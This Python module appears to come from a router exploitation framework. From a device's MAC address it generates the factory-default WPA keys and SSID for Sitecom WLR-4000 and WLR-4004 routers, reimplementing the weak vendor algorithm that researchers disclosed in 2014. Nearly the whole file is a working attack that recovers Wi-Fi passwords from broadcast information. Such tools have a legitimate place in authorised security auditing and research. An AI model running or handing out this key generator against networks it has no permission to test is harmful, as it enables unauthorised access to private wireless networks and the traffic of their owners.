# Name:Default WPA key generator for Sitecom WLR-4000/4004 routers
# File:wlr-400X_mac2wpa.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 22.7.2015
# Last modified: 22.7.2015
# Shodan Dork:
# Description: Generates default WPA key for Sitecom WLR-4000/4004 routers
# Based on work of Roberto Paleari (@rpaleari) and Alessandro Di Pinto (@adipinto)
# http://blog.emaze.net/2014/04/sitecom-firmware-and-wifi.html

import core.Misc
import core.io
from interface.messages import print_success, print_error, print_help, print_info
from interface.utils import validate_mac, lookup_mac

import binascii


class Misc(core.Misc.RextMisc):
    """
Name:Default WPA key generator for Sitecom WLR-4000/4004 routers
File:wlr-400X_mac2wpa.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 22.7.2015
Description: Generates default WPA key for Sitecom WLR-4000/4004 routers
Based on: Work of Roberto Paleari (@rpaleari) and Alessandro Di Pinto (@adipinto)
    http://blog.emaze.net/2014/04/sitecom-firmware-and-wifi.html

Options:
    Name        Description

    mac         MAC address used as input for WPA password generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("please provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac = self.mac
        mac = mac.upper()
        mac = mac.replace("-", "")
        mac = mac.replace(":", "")
        ssid = "Sitecom%s" % mac[6:].upper()
        wpa_4000 = self.generate_key(mac, "4000")
        wpa_4004 = self.generate_key(mac, "4004")

        print_success("WPA keys generated")
        print("SSID:" + ssid)
        print("WPA Key for model WLR-4000: " + wpa_4000)
        print("WPA Key for model WLR-4004: " + wpa_4004)

    def generate_key(self, mac, model, keylength=12):
        charsets = {
            "4000": (
                "23456789ABCDEFGHJKLMNPQRSTUVWXYZ38BZ",
                "WXCDYNJU8VZABKL46PQ7RS9T2E5H3MFGPWR2"
            ),

            "4004": (
                "JKLMNPQRST23456789ABCDEFGHUVWXYZ38BK",
                "E5MFJUWXCDKL46PQHAB3YNJ8VZ7RS9TR2GPW"
            ),
        }

        charset1, charset2 = charsets[model]
        mac = bytearray.fromhex(mac)

        val = int(binascii.hexlify(mac[2:6]), 16)

        magic1 = 0x98124557
        magic2 = 0x0004321a
        magic3 = 0x80000000

        offsets = []
        for i in range(keylength):
            if (val & 0x1) == 0:
                val ^= magic2
                val >>= 1
            else:
                val ^= magic1
                val >>= 1
                val |= magic3

            offset = val % len(charset1)
            offsets.append(offset)

        wpakey = ""
        wpakey += charset1[offsets[0]]

        for i in range(0, keylength-1):
            magic3 = offsets[i]
            magic1 = offsets[i+1]

            if magic3 != magic1:
                magic3 = charset1[magic1]
            else:
                magic3 = (magic3 + i) % len(charset1)
                magic3 = charset2[magic3]
            wpakey += magic3

        return wpakey

Misc()